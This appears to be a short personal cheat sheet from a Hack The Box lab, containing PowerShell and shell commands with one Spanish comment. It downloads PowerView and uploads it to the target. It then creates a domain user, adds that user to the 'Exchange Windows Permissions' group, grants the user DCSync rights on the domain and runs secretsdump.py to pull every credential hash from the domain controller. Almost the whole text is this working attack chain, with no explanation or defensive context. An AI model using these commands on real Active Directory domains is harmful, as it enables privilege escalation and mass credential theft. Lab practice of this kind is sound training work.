```shell
#POWERVIEW
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
upload PowerView.ps1
Import-Module .\PowerView.ps1


#CREATE USER
net user Gorka Gorka123! /add /domain
net group "Exchange Windows Permissions" Gorka /add
$SecPassword = ConvertTo-SecureString 'Gorka123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\Gorka', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Gorka -Rights DCSync
#CAMBIAR EL DC=htb por el primer valor de htb.local y el otro DC=local por el segundo valor de htb.local

secretsdump.py htb.local/Gorka@10.10.10.161                                                   
```